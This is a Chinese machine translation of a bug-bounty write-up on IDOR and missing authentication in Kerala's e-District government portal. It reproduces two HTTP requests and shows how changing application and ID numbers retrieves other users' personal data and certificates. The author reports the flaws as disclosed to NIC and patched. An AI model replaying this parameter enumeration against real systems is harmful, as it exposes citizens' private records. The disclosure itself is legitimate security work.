<html>
<head>
<title>I Secured More Than 10 Million User's Data on the Kerala Government Website Maintained by NIC.</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我保护了由NIC维护的喀拉拉邦政府网站上超过1000万用户的数据。</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/i-secured-more-than-10-million-users-data-on-the-kerala-government-website-maintained-by-nic-fb7d5a9f156b?source=collection_archive---------1-----------------------#2022-05-06">https://infosecwriteups.com/i-secured-more-than-10-million-users-data-on-the-kerala-government-website-maintained-by-nic-fb7d5a9f156b?source=collection_archive---------1-----------------------#2022-05-06</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="c2dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨黑客们！！我再次带着喀拉拉邦政府网站上的新漏洞回来了。</p><p id="6a7b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于那些不认识我的人，请在谷歌上搜索我的名字“克里希纳德夫·梅莱维拉”</p><p id="46b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">目标地点是:<a class="ae kl" href="http://edistrict.kerala.gov.in/" rel="noopener ugc nofollow" target="_blank">http://edistrict.kerala.gov.in/</a></p><p id="c3ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">什么是电子地区入门网站？</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/cf05678ed7a0b53bdda30e91d9514ba5.png" data-original-src="https://miro.medium.com/v2/resize:fit:662/format:webp/0*AH4q3fqCR13D4d6X.png"/></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">Krishnadev P Melevila保护喀拉拉邦电子区门户网站</figcaption></figure><pre class="kn ko kp kq gt ky kz la lb aw lc bi"><span id="572e" class="ld le iq kz b gy lf lg l lh li">Kerala E-District project intend to provide Government services to citizens through Common Service Centers(CSC) which are easily accessible. Services from different departments are brought under one umbrella at any CSC. Some of the services are also made available through online portal. It utilizes backend computerization to e-enable the delivery of services and ensures transparency and uniform application of rules. The project involves integrated and seamless delivery of services to public by automation, integration and incorporating Business Process Re-Engineering(BPR) where ever required. In a nutshell Edistrict is a tailor made program for minimizing effort and time to provide prompt and effective services to the public.</span></pre></div><div class="ab cl lj lk hu ll" role="separator"><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo"/></div><div class="ij ik il im in"><p id="b1ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以让我们开始吧，</p><blockquote class="lq lr ls"><p id="687d" class="jn jo lt jp b jq jr js jt ju jv jw jx lu jz ka kb lv kd ke kf lw kh ki kj kk ij bi translated">漏洞:IDOR +不正确的身份验证</p><p id="752f" class="jn jo lt jp b jq jr js jt ju jv jw jx lu jz ka kb lv kd ke kf lw kh ki kj kk ij bi translated">影响:关键</p><p id="6479" class="jn jo lt jp b jq jr js jt ju jv jw jx lu jz ka kb lv kd ke kf lw kh ki kj kk ij bi translated">风险:攻击者可以查看/编辑/修改用户(受害者)的数据。</p><p id="dd7f" class="jn jo lt jp b jq jr js jt ju jv jw jx lu jz ka kb lv kd ke kf lw kh ki kj kk ij bi translated">优先级:P0</p><p id="6835" class="jn jo lt jp b jq jr js jt ju jv jw jx lu jz ka kb lv kd ke kf lw kh ki kj kk ij bi translated">范围:攻击者可以下载其他用户的证书，<br/>查看/编辑/修改其他用户的敏感数据。总访问<br/>控制</p></blockquote><p id="6fb5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在攻击者视点中重现的步骤:</p><p id="faff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.两个端点易受攻击。</p><pre class="kn ko kp kq gt ky kz la lb aw lc bi"><span id="e834" class="ld le iq kz b gy lf lg l lh li">POST /dwr/call/plaincall/registrationDAO.getApplicantAgeGenDWR.dwr HTTP/1.1<br/>Host: edistrict.kerala.gov.in<br/>Cookie: &lt;REDACTED&gt;<br/>Content-Length: 344<br/>Sec-Ch-Ua: &lt;REDACTED&gt;<br/>User-Agent: &lt;REDACTED&gt;<br/>Content-Type: text/plain<br/>Accept: */*<br/>Origin: <a class="ae kl" href="https://edistrict.kerala.gov.in" rel="noopener ugc nofollow" target="_blank">https://edistrict.kerala.gov.in</a><br/>Sec-Fetch-Site: same-origin<br/>Sec-Fetch-Mode: cors<br/>Sec-Fetch-Dest: empty<br/>Referer: &lt;REDACTED&gt;<br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: en-US,en;q=0.9,ml;q=0.8,hi;q=0.7<br/>Connection: close<br/>callCount=1<br/>windowName=<br/>c0-scriptName=registrationDAO<br/>c0-methodName=getApplicantAgeGenDWR<br/>c0-id=0<br/>c0-param0=number:3735XXXX<br/>batchId=4<br/>instanceId=0<br/>page=&lt;REDACTED&gt;</span></pre><p id="9e86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面是对此端点的调查:<br/>❖cookie/会话验证没有完成。<br/> ❖ IDOR检测到<br/> ❖如果攻击者将' c0-param0=number '参数从' 3735XXXX '更改为<br/>任何其他类似的值，攻击者将获得一些随机的用户敏感信息，如身份证号、年龄、电话、电子邮件、收入详情等…</p></div><div class="ab cl lj lk hu ll" role="separator"><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo"/></div><div class="ij ik il im in"><p id="f880" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二个</p><pre class="kn ko kp kq gt ky kz la lb aw lc bi"><span id="a5d9" class="ld le iq kz b gy lf lg l lh li">POST /openSearch.do HTTP/1.1<br/>Host: edistrict.kerala.gov.in<br/>Cookie: &lt;REDACTED&gt;<br/>JSESSIONID=8Bd+K88MaOh-XbWczEiY0g__.node1<br/>Content-Length: 348<br/>Cache-Control: &lt;REDACTED&gt;<br/>Sec-Ch-Ua-Mobile: ?0<br/>Sec-Ch-Ua-Platform: &lt;REDACTED&gt;<br/>Upgrade-Insecure-Requests: 1<br/>Origin: <a class="ae kl" href="https://edistrict.kerala.gov.in" rel="noopener ugc nofollow" target="_blank">https://edistrict.kerala.gov.in</a><br/>Content-Type: application/x-www-form-urlencoded<br/>User-Agent: &lt;REDACTED&gt;<br/>Accept:<br/>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q<br/>=0.8,application/signed-exchange;v=b3;q=0.9<br/>Sec-Fetch-Site: same-origin<br/>Sec-Fetch-Mode: navigate<br/>Sec-Fetch-User: ?1<br/>Sec-Fetch-Dest: document<br/>Referer:&lt;REDACTED&gt;<br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: en-US,en;q=0.9,ml;q=0.8,hi;q=0.7<br/>Connection: close<br/>s_code=RC&amp;updated_date=&amp;tknName=token&amp;token=16516737194326072874285415736384&amp;action=&amp;fromDat<br/>eHidden=&amp;toDateHidden=&amp;tknName=token&amp;token=16516737194326072874285415736384&amp;tknName=token&amp;lo<br/>gin=&amp;navigate=&amp;txtApplicationNo=&amp;userHidden=&amp;receiptHidden=&amp;searchService=qrPrint&amp;srvceType=<br/>cert&amp;applNo=70913065&amp;appno=&amp;proceedingform=&amp;servicetype=Non-Creamy+Layer</span></pre><p id="fb8d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下是对该终点的调查:</p><p id="5186" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">❖参数“cert&amp;applNo”易受IDOR攻击。<br/> ❖无会话/cookie验证。</p><p id="71ce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过利用这个端点，攻击者可以下载政府颁发的其他用户的证书。</p><p id="76ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">证明</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi lx"><img src="../Images/69e8b784d9a8a422ae4b54a31360b6f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:814/format:webp/1*KBxGlOTBFHokWNoj7Y923A.png"/></div></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ly"><img src="../Images/8f0ed43f2ff4c21643d3e8b2cd1b5d8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:896/format:webp/1*PWd88WH7B5jJfCrnAx__kw.png"/></div></figure></div><div class="ab cl lj lk hu ll" role="separator"><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo"/></div><div class="ij ik il im in"><p id="e369" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">就这样结束了！！现在我已经向国家信息中心报告了3个漏洞，其中3个已经被修补。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ma mb di mc bf md"><div class="gh gi lz"><img src="../Images/299e70f9e7abd8b6e1fa108a357404f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Xpo0203zJ1ylWkGvaZ95UQ.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">漏洞已修补</figcaption></figure><p id="edf4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在NIC上的第一个漏洞:<a class="ae kl" href="https://medium.com/bugbountywriteup/exposing-millions-of-critical-data-on-kerala-civil-supplies-website-cc3a4bed5d07" rel="noopener">https://medium . com/bugbountywriteup/exposure-million-of-critical-data-on-Kerala-civil-supplies-website-cc 3 a4 bed 5d 07</a></p><p id="de11" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在NIC上的第二个漏洞:<a class="ae kl" href="https://medium.com/bugbountywriteup/api-authentication-bypass-on-national-informatics-centre-d438b3bae085" rel="noopener">https://medium . com/bugbountywriteup/API-authentic ation-bypass-on-national-informatics-centre-d 438 B3 BAE 085</a></p><p id="88a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我的其他错误报告:<a class="ae kl" href="https://medium.com/@krishnadevpmelevila" rel="noopener">https://medium.com/@krishnadevpmelevila</a></p><p id="9e10" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="lt">别忘了在medium等社交媒体上关注我。也请为这篇文章鼓掌50次，这是我写更多的灵感！！</em> </strong></p><p id="b003" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我需要你的支持来写更多的东西，请给我买杯咖啡吧:【https://www.buymeacoffee.com/krishnadevpm T21】</p><p id="5631" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lt">我的Instagram手柄:</em><a class="ae kl" href="https://instagram.com/krishnadev_p_melevila" rel="noopener ugc nofollow" target="_blank"><em class="lt">https://instagram.com/krishnadev_p_melevila</em>T5】</a></p><p id="ebe3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lt">我的推特句柄:</em><a class="ae kl" href="https://twitter.com/Krishnadev_P_M" rel="noopener ugc nofollow" target="_blank"><em class="lt">https://twitter.com/Krishnadev_P_M</em></a></p><p id="f4bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lt">我的LinkedIn句柄:</em><a class="ae kl" href="https://www.linkedin.com/in/krishnadevpmelevila/" rel="noopener ugc nofollow" target="_blank"><em class="lt">https://www.linkedin.com/in/krishnadevpmelevila/</em></a></p><p id="ba2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lt">我的人事网站:</em><a class="ae kl" href="http://krishnadevpmelevila.com/" rel="noopener ugc nofollow" target="_blank">【http://krishnadevpmelevila.com/】T21</a></p></div></div>    
</body>
</html>